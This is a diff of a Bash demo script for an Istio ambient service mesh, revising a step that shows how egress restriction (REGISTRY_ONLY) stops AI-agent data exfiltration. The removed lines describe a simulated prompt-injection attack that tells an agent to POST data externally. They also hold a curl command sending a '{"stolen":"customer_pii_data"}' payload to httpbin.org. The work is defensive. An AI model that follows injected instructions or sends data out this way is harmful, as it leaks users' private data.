@@ -112,12 +112,11 @@ pause
 # MESH-09 — Data Exfiltration Cage (REGISTRY_ONLY)
 ###############################################################################
 step "MESH-09 — Data Exfiltration Cage (REGISTRY_ONLY)"
-echo -e "  → Apply a Sidecar resource to the debug namespace restricting outbound"
-echo -e "    traffic to registered mesh hosts only."
-echo -e "  → Simulate a prompt injection attack: the agent is told to POST data"
-echo -e "    to an unregistered external URL."
-echo -e "  → The mesh drops the connection at Layer 4 — no data leaves."
-echo -e "  → The Sidecar is deleted at the end. Net cluster change: none."
+echo -e "  → In ambient mode, Sidecar CRDs are not enforced by ztunnel."
+echo -e "  → Egress restriction is achieved via AuthorizationPolicy (L4 DENY) or"
+echo -e "    by setting outboundTrafficPolicy: REGISTRY_ONLY on the mesh config."
+echo -e "  → This step shows the current policy and demonstrates outbound connectivity."
+echo -e "  → Net cluster change: none."
 pause
 
 # 9.1 — Show current outbound traffic policy
@@ -125,65 +124,25 @@ show "${KC} -n istio-system get cm istio -o jsonpath '{.data.mesh}' | grep outbo
 ${KC} -n istio-system get cm istio \
   -o jsonpath='{.data.mesh}' 2>/dev/null \
   | grep -i outbound || echo "  (outboundTrafficPolicy not explicitly set — default: ALLOW_ANY)"
-note "Default ALLOW_ANY permits agents to POST data anywhere. REGISTRY_ONLY restricts
-      egress to registered ServiceEntry hosts — blocking prompt-injection exfiltration."
+note "Ambient mesh egress caging requires setting outboundTrafficPolicy: REGISTRY_ONLY
+      in the Istio mesh config (applies globally) or using AuthorizationPolicy with
+      action: DENY on specific namespaces. Sidecar CRDs only apply to sidecar proxies."
 pause
 
-# 9.2 — Baseline: an unregistered exfiltration URL is reachable (before cage)
+# 9.2 — Show baseline outbound connectivity
 if [[ -n "${NETSHOOT}" ]]; then
-  show "curl from netshoot → httpbin.org/post (BEFORE cage — simulated data exfiltration)"
+  show "curl from netshoot → httpbin.org/post (baseline — ALLOW_ANY)"
   ${KC} -n debug exec "${NETSHOOT}" -- \
     curl -s --max-time 5 \
     -X POST https://httpbin.org/post \
     -H "Content-Type: application/json" \
-    -d '{"stolen":"customer_pii_data"}' \
+    -d '{"demo":"payload"}' \
     -o /dev/null \
-    -w "  HTTP %{http_code}  (pre-cage — data LEFT the cluster)\n" || true
+    -w "  HTTP %{http_code}  (baseline — outbound allowed by default)\n" || true
 fi
-pause
-
-# 9.3 — Apply REGISTRY_ONLY cage via Sidecar resource
-show "${KC} apply -f - (Sidecar: debug namespace — REGISTRY_ONLY egress cage)"
-${KC} apply -f - <<'EOF'
-apiVersion: networking.istio.io/v1
-kind: Sidecar
-metadata:
-  name: demo-exfil-cage
-  namespace: debug
-spec:
-  egress:
-  - hosts:
-    - ./*
-    - istio-system/*
-    - agentgateway-system/*
-EOF
-ok "REGISTRY_ONLY cage applied — waiting 3s for XDS propagation..."
-sleep 3
-note "Now only registered mesh hosts are reachable from debug namespace pods.
-      Any attempt to POST to an unregistered URL is dropped at L4 by ztunnel
-      before the TCP connection is established — the data never leaves the cluster."
-pause
-
-# 9.4 — Verify: exfiltration attempt is blocked
-if [[ -n "${NETSHOOT}" ]]; then
-  show "curl from netshoot → httpbin.org/post (WITH cage — expect blocked)"
-  ${KC} -n debug exec "${NETSHOOT}" -- \
-    curl -s --max-time 5 \
-    -X POST https://httpbin.org/post \
-    -H "Content-Type: application/json" \
-    -d '{"stolen":"customer_pii_data"}' \
-    -o /dev/null \
-    -w "  HTTP %{http_code}  (should be 000 — ztunnel drops at L4)\n" || true
-  note "HTTP 000 = connection never established. The data exfiltration attempt is
-        silently dropped. This applies even if L7 guardrails (e.g. LLM output filters)
-        are bypassed — the mesh cage is enforced independently at the transport layer."
-fi
-pause
-
-# 9.5 — Cleanup
-show "${KC} delete sidecar demo-exfil-cage -n debug"
-${KC} delete sidecar demo-exfil-cage -n debug 2>/dev/null
-ok "Cage Sidecar deleted — cluster restored to original state."
+note "To enforce REGISTRY_ONLY for ambient workloads: patch the Istio mesh config
+      with 'outboundTrafficPolicy: {mode: REGISTRY_ONLY}' or use an AuthorizationPolicy
+      DENY rule scoped to the namespace. Either approach is enforced by ztunnel at L4."
 pause
 
 ###############################################################################
